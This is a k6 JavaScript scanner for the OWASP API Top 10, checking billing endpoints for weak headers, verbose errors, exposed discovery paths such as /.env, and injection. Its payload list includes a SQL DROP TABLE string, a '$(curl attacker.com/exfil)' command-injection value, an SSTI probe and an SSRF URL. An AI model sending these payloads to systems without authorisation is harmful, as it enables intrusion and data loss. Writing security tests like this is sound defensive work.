            if (!response.headers['Strict-Transport-Security'] && !response.headers['strict-transport-security']) {
                missingHeaders.push('Strict-Transport-Security');
            }

            // Check for overly permissive CORS
            const acao = response.headers['Access-Control-Allow-Origin'] || response.headers['access-control-allow-origin'];
            if (acao === '*') {
                logFinding('api8', '/v1/billing/subscriptions/{id}/transactions', 'get',
                    'CORS allows all origins (Access-Control-Allow-Origin: *)',
                    { status: response.status });
            }

            if (missingHeaders.length > 0) {
                logFinding('api8', '/v1/billing/subscriptions/{id}/transactions', 'get',
                    `Missing security headers: ${missingHeaders.join(', ')}`,
                    { status: response.status, missingHeaders });
            }
        }

        // Test for verbose errors
        {
            const testPath = replacePathParams('/v1/billing/plans');
            const malformedBody = '{"invalid": "json';
            http.cookieJar().clear(BASE_URL + testPath);
            const response = http.post(BASE_URL + testPath, malformedBody, {
                headers: { 'Content-Type': 'application/json', ...CUSTOM_HEADERS },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            const errorIndicators = ['stack trace', 'exception', 'at line', 'syntax error'];
            const bodyLower = response.body.toLowerCase();

            if (errorIndicators.some(ind => bodyLower.includes(ind))) {
                logFinding('api8', '/v1/billing/plans', 'post',
                    'Verbose error messages exposed',
                    { status: response.status });
            }
        }
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}');
            const malformedBody = '{"invalid": "json';
            http.cookieJar().clear(BASE_URL + testPath);
            const response = http.patch(BASE_URL + testPath, malformedBody, {
                headers: { 'Content-Type': 'application/json', ...CUSTOM_HEADERS },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            const errorIndicators = ['stack trace', 'exception', 'at line', 'syntax error'];
            const bodyLower = response.body.toLowerCase();

            if (errorIndicators.some(ind => bodyLower.includes(ind))) {
                logFinding('api8', '/v1/billing/plans/{id}', 'patch',
                    'Verbose error messages exposed',
                    { status: response.status });
            }
        }
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/activate');
            const malformedBody = '{"invalid": "json';
            http.cookieJar().clear(BASE_URL + testPath);
            const response = http.post(BASE_URL + testPath, malformedBody, {
                headers: { 'Content-Type': 'application/json', ...CUSTOM_HEADERS },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            const errorIndicators = ['stack trace', 'exception', 'at line', 'syntax error'];
            const bodyLower = response.body.toLowerCase();

            if (errorIndicators.some(ind => bodyLower.includes(ind))) {
                logFinding('api8', '/v1/billing/plans/{id}/activate', 'post',
                    'Verbose error messages exposed',
                    { status: response.status });
            }
        }
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/deactivate');
            const malformedBody = '{"invalid": "json';
            http.cookieJar().clear(BASE_URL + testPath);
            const response = http.post(BASE_URL + testPath, malformedBody, {
                headers: { 'Content-Type': 'application/json', ...CUSTOM_HEADERS },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            const errorIndicators = ['stack trace', 'exception', 'at line', 'syntax error'];
            const bodyLower = response.body.toLowerCase();

            if (errorIndicators.some(ind => bodyLower.includes(ind))) {
                logFinding('api8', '/v1/billing/plans/{id}/deactivate', 'post',
                    'Verbose error messages exposed',
                    { status: response.status });
            }
        }
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/update-pricing-schemes');
            const malformedBody = '{"invalid": "json';
            http.cookieJar().clear(BASE_URL + testPath);
            const response = http.post(BASE_URL + testPath, malformedBody, {
                headers: { 'Content-Type': 'application/json', ...CUSTOM_HEADERS },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            const errorIndicators = ['stack trace', 'exception', 'at line', 'syntax error'];
            const bodyLower = response.body.toLowerCase();

            if (errorIndicators.some(ind => bodyLower.includes(ind))) {
                logFinding('api8', '/v1/billing/plans/{id}/update-pricing-schemes', 'post',
                    'Verbose error messages exposed',
                    { status: response.status });
            }
        }
        {
            const testPath = replacePathParams('/v1/billing/subscriptions');
            const malformedBody = '{"invalid": "json';
            http.cookieJar().clear(BASE_URL + testPath);
            const response = http.post(BASE_URL + testPath, malformedBody, {
                headers: { 'Content-Type': 'application/json', ...CUSTOM_HEADERS },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            const errorIndicators = ['stack trace', 'exception', 'at line', 'syntax error'];
            const bodyLower = response.body.toLowerCase();

            if (errorIndicators.some(ind => bodyLower.includes(ind))) {
                logFinding('api8', '/v1/billing/subscriptions', 'post',
                    'Verbose error messages exposed',
                    { status: response.status });
            }
        }
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}');
            const malformedBody = '{"invalid": "json';
            http.cookieJar().clear(BASE_URL + testPath);
            const response = http.patch(BASE_URL + testPath, malformedBody, {
                headers: { 'Content-Type': 'application/json', ...CUSTOM_HEADERS },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            const errorIndicators = ['stack trace', 'exception', 'at line', 'syntax error'];
            const bodyLower = response.body.toLowerCase();

            if (errorIndicators.some(ind => bodyLower.includes(ind))) {
                logFinding('api8', '/v1/billing/subscriptions/{id}', 'patch',
                    'Verbose error messages exposed',
                    { status: response.status });
            }
        }
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/activate');
            const malformedBody = '{"invalid": "json';
            http.cookieJar().clear(BASE_URL + testPath);
            const response = http.post(BASE_URL + testPath, malformedBody, {
                headers: { 'Content-Type': 'application/json', ...CUSTOM_HEADERS },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            const errorIndicators = ['stack trace', 'exception', 'at line', 'syntax error'];
            const bodyLower = response.body.toLowerCase();

            if (errorIndicators.some(ind => bodyLower.includes(ind))) {
                logFinding('api8', '/v1/billing/subscriptions/{id}/activate', 'post',
                    'Verbose error messages exposed',
                    { status: response.status });
            }
        }
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/cancel');
            const malformedBody = '{"invalid": "json';
            http.cookieJar().clear(BASE_URL + testPath);
            const response = http.post(BASE_URL + testPath, malformedBody, {
                headers: { 'Content-Type': 'application/json', ...CUSTOM_HEADERS },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            const errorIndicators = ['stack trace', 'exception', 'at line', 'syntax error'];
            const bodyLower = response.body.toLowerCase();

            if (errorIndicators.some(ind => bodyLower.includes(ind))) {
                logFinding('api8', '/v1/billing/subscriptions/{id}/cancel', 'post',
                    'Verbose error messages exposed',
                    { status: response.status });
            }
        }
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/capture');
            const malformedBody = '{"invalid": "json';
            http.cookieJar().clear(BASE_URL + testPath);
            const response = http.post(BASE_URL + testPath, malformedBody, {
                headers: { 'Content-Type': 'application/json', ...CUSTOM_HEADERS },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            const errorIndicators = ['stack trace', 'exception', 'at line', 'syntax error'];
            const bodyLower = response.body.toLowerCase();

            if (errorIndicators.some(ind => bodyLower.includes(ind))) {
                logFinding('api8', '/v1/billing/subscriptions/{id}/capture', 'post',
                    'Verbose error messages exposed',
                    { status: response.status });
            }
        }
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/revise');
            const malformedBody = '{"invalid": "json';
            http.cookieJar().clear(BASE_URL + testPath);
            const response = http.post(BASE_URL + testPath, malformedBody, {
                headers: { 'Content-Type': 'application/json', ...CUSTOM_HEADERS },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            const errorIndicators = ['stack trace', 'exception', 'at line', 'syntax error'];
            const bodyLower = response.body.toLowerCase();

            if (errorIndicators.some(ind => bodyLower.includes(ind))) {
                logFinding('api8', '/v1/billing/subscriptions/{id}/revise', 'post',
                    'Verbose error messages exposed',
                    { status: response.status });
            }
        }
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/suspend');
            const malformedBody = '{"invalid": "json';
            http.cookieJar().clear(BASE_URL + testPath);
            const response = http.post(BASE_URL + testPath, malformedBody, {
                headers: { 'Content-Type': 'application/json', ...CUSTOM_HEADERS },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            const errorIndicators = ['stack trace', 'exception', 'at line', 'syntax error'];
            const bodyLower = response.body.toLowerCase();

            if (errorIndicators.some(ind => bodyLower.includes(ind))) {
                logFinding('api8', '/v1/billing/subscriptions/{id}/suspend', 'post',
                    'Verbose error messages exposed',
                    { status: response.status });
            }
        }
    });
}

// API9: Improper Inventory Management
function testInventory() {
    group('API9 - Inventory Management', function() {
        console.log('[API9] Testing Improper Inventory Management...');

        const discoveryPaths = [
            '/swagger',
            '/swagger-ui',
            '/swagger.json',
            '/api-docs',
            '/openapi',
            '/openapi.json',
            '/graphql',
            '/graphiql',
            '/debug',
            '/actuator',
            '/actuator/health',
            '/actuator/env',
            '/metrics',
            '/.env',
            '/config',
        ];

        const apiVersions = ['v1', 'v2', 'v3', 'api/v1', 'api/v2'];

        discoveryPaths.forEach(path => {
            http.cookieJar().clear(BASE_URL + path);
            const response = http.get(BASE_URL + path, { headers: CUSTOM_HEADERS, timeout: TIMEOUT, jar: null });
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status !== 404) {
                logFinding('api9', path, 'GET',
                    `Undocumented endpoint discovered (HTTP ${response.status})`,
                    { status: response.status });
            }
        });

        // Check for old API versions
        apiVersions.forEach(version => {
            http.cookieJar().clear(BASE_URL + '/' + version + '/');
            const response = http.get(BASE_URL + '/' + version + '/', { headers: CUSTOM_HEADERS, timeout: TIMEOUT, jar: null });
            testsRun.add(1);

            if (response.status !== 404) {
                logFinding('api9', '/' + version + '/', 'GET',
                    `API version endpoint exists (HTTP ${response.status})`,
                    { status: response.status });
            }
        });
    });
}

// API10: Unsafe Consumption of APIs
function testUnsafeConsumption() {
    group('API10 - Unsafe Consumption', function() {
        console.log('[API10] Testing Unsafe Consumption...');

        const injectionPayloads = [
            { external_id: "'; DROP TABLE users;--" },
            { integration_data: "$(curl attacker.com/exfil)" },
            { template: "{{7*7}}" },
            { webhook_url: "http://127.0.0.1:8080/internal" },
        ];

        // Test /v1/billing/plans with injection payloads
        {
            const testPath = replacePathParams('/v1/billing/plans');
            injectionPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                // Check if payload was processed (e.g., SSTI returning 49)
                if (response.body.includes('49')) {
                    logFinding('api10', '/v1/billing/plans', 'post',
                        'Server-side template injection detected',
                        { status: response.status, payload });
                }
            });
        }
        // Test /v1/billing/plans/{id} with injection payloads
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}');
            injectionPayloads.forEach(payload => {
                const response = authRequest('patch', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                // Check if payload was processed (e.g., SSTI returning 49)
                if (response.body.includes('49')) {
                    logFinding('api10', '/v1/billing/plans/{id}', 'patch',
                        'Server-side template injection detected',
                        { status: response.status, payload });
                }
            });
        }
        // Test /v1/billing/plans/{id}/activate with injection payloads
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/activate');
            injectionPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                // Check if payload was processed (e.g., SSTI returning 49)
                if (response.body.includes('49')) {
                    logFinding('api10', '/v1/billing/plans/{id}/activate', 'post',
                        'Server-side template injection detected',
                        { status: response.status, payload });
                }
            });
        }
        // Test /v1/billing/plans/{id}/deactivate with injection payloads
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/deactivate');
            injectionPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                // Check if payload was processed (e.g., SSTI returning 49)
                if (response.body.includes('49')) {
                    logFinding('api10', '/v1/billing/plans/{id}/deactivate', 'post',
                        'Server-side template injection detected',
                        { status: response.status, payload });
                }
            });
        }
        // Test /v1/billing/plans/{id}/update-pricing-schemes with injection payloads
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/update-pricing-schemes');
            injectionPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                // Check if payload was processed (e.g., SSTI returning 49)
                if (response.body.includes('49')) {
                    logFinding('api10', '/v1/billing/plans/{id}/update-pricing-schemes', 'post',
                        'Server-side template injection detected',
                        { status: response.status, payload });
                }
            });
        }
        // Test /v1/billing/subscriptions with injection payloads
        {
            const testPath = replacePathParams('/v1/billing/subscriptions');
            injectionPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                // Check if payload was processed (e.g., SSTI returning 49)
                if (response.body.includes('49')) {
                    logFinding('api10', '/v1/billing/subscriptions', 'post',
                        'Server-side template injection detected',
                        { status: response.status, payload });
                }
            });
        }
        // Test /v1/billing/subscriptions/{id} with injection payloads
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}');
            injectionPayloads.forEach(payload => {
                const response = authRequest('patch', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                // Check if payload was processed (e.g., SSTI returning 49)
                if (response.body.includes('49')) {
                    logFinding('api10', '/v1/billing/subscriptions/{id}', 'patch',
                        'Server-side template injection detected',
                        { status: response.status, payload });
                }
            });
        }
        // Test /v1/billing/subscriptions/{id}/activate with injection payloads
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/activate');
            injectionPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                // Check if payload was processed (e.g., SSTI returning 49)
                if (response.body.includes('49')) {
                    logFinding('api10', '/v1/billing/subscriptions/{id}/activate', 'post',
                        'Server-side template injection detected',
                        { status: response.status, payload });
                }
            });
        }
        // Test /v1/billing/subscriptions/{id}/cancel with injection payloads
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/cancel');
            injectionPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                // Check if payload was processed (e.g., SSTI returning 49)
                if (response.body.includes('49')) {
                    logFinding('api10', '/v1/billing/subscriptions/{id}/cancel', 'post',
                        'Server-side template injection detected',
                        { status: response.status, payload });
                }
            });
        }
        // Test /v1/billing/subscriptions/{id}/capture with injection payloads
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/capture');
            injectionPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                // Check if payload was processed (e.g., SSTI returning 49)
                if (response.body.includes('49')) {
                    logFinding('api10', '/v1/billing/subscriptions/{id}/capture', 'post',
                        'Server-side template injection detected',
                        { status: response.status, payload });
                }
            });
        }
        // Test /v1/billing/subscriptions/{id}/revise with injection payloads
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/revise');
            injectionPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                // Check if payload was processed (e.g., SSTI returning 49)
                if (response.body.includes('49')) {
                    logFinding('api10', '/v1/billing/subscriptions/{id}/revise', 'post',
                        'Server-side template injection detected',
                        { status: response.status, payload });
                }
            });
        }
        // Test /v1/billing/subscriptions/{id}/suspend with injection payloads
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/suspend');
            injectionPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                // Check if payload was processed (e.g., SSTI returning 49)
                if (response.body.includes('49')) {
                    logFinding('api10', '/v1/billing/subscriptions/{id}/suspend', 'post',
                        'Server-side template injection detected',
                        { status: response.status, payload });
                }
            });
        }
    });
}

// Main test function
export default function() {
    // Clear cookie jar to prevent duplication with manually specified Cookie headers.
    // k6 accumulates cookies from Set-Cookie response headers in its VU cookie jar,
    // which can cause duplicate cookie values even when jar:null is set per-request.
    http.cookieJar().clear(BASE_URL);

    console.log('Starting OWASP API Top 10 Security Scan...');
    console.log('Target: ' + BASE_URL);
    console.log('');

    testBrokenAuth();

    sleep(0.1);
}

// Teardown: Output results
export function teardown(data) {
    console.log('');
    console.log('='.repeat(50));
    console.log('OWASP API Top 10 Scan Complete');
    console.log('='.repeat(50));
    console.log('Total findings: ' + findings.length);

    if (findings.length > 0) {
        console.log('');
        console.log('Findings by category:');
        const byCategory = {};
        findings.forEach(f => {
            byCategory[f.category] = (byCategory[f.category] || 0) + 1;
        });
        Object.entries(byCategory).forEach(([cat, count]) => {
            console.log('  ' + cat + ': ' + count);
        });
    }

    // Write JSON report
    console.log('');
    console.log('Report written to: owasp-report.json');
}
